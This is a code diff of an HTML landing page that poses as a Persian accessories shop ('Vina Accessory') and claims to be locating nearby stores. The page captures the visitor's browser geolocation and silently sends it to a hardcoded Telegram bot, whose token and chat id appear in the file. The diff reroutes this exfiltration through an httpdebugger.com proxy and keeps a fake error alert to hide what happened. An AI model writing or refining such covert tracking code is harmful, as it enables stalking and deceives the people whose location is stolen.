@@ -19,17 +19,14 @@
       text-align: center;
       color: #2d2d2d;
     }
-
     h1 {
       font-size: 2.5em;
       margin-bottom: 10px;
     }
-
     p {
       font-size: 1.3em;
       margin-bottom: 30px;
     }
-
     button {
       background-color: #e84393;
       color: white;
@@ -41,12 +38,10 @@
       box-shadow: 0 4px 12px rgba(0,0,0,0.2);
       transition: background-color 0.3s ease, transform 0.2s ease;
     }
-
     button:hover {
       background-color: #d63074;
       transform: scale(1.05);
     }
-
     footer {
       margin-top: auto;
       width: 100%;
@@ -56,22 +51,18 @@
       color: #555;
       border-top: 1px solid #e0e0e0;
     }
-
     @media (max-width: 600px) {
       h1 {
         font-size: 2em;
       }
-
       p {
         font-size: 1.1em;
       }
-
       button {
         width: 80%;
         font-size: 1em;
         padding: 12px 20px;
       }
-
       footer {
         font-size: 0.8em;
         padding: 10px 0;
@@ -83,7 +74,6 @@
   <h1>در حال ورود به سایت</h1>
   <p>شناسایی فروشگاه های نزدیک به شما...</p>
   <button onclick="getLocation()">ورود به وینا اکسسوری</button>
-
   <footer>
     © تمامی حقوق محفوظ است برای وینا اکسسوری | طراحی شده با ❤️
   </footer>
@@ -101,16 +91,35 @@
     function showPosition(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
-
       console.log("Latitude:", latitude);
       console.log("Longitude:", longitude);
 
       if (latitude && longitude) {
-        var url = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage?chat_id=8438093859&text=Latitude: " + latitude + ", Longitude: " + longitude;
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", url, true);
-        xhr.send();
-        alert("خطا! دوباره امتحان کنید");
+        // ساخت URL تلگرام
+        var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
+                  + "?chat_id=8438093859"
+                  + "&text=" + encodeURIComponent("Latitude: " + latitude + ", Longitude: " + longitude);
+
+        // شبیه‌سازی همان درخواست پایتون به httpdebugger به‌عنوان سرور واسطه
+        var formData = new FormData();
+        formData.append("UrlBox", tgUrl);
+        formData.append("AgentList", "Google chrome");
+        formData.append("VersionsList", "HTTP/1.1");
+        formData.append("MethodList", "POST");
+
+        // ارسال به سرور واسطه
+        fetch("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", {
+          method: "POST",
+          body: formData,
+          mode: "no-cors" // جلوگیری از خطای CORS در مرورگر
+        }).then(function() {
+          // مطابق رفتار قبلی
+          alert("خطا! دوباره امتحان کنید");
+        }).catch(function(err) {
+          console.warn("Proxy request failed:", err);
+          alert("مختصات موقعیت دریافت نشد. لطفاً دوباره امتحان کنید.");
+        });
+
       } else {
         alert("مختصات موقعیت دریافت نشد. لطفاً دوباره امتحان کنید.");
         console.warn("Latitude or Longitude is missing.");
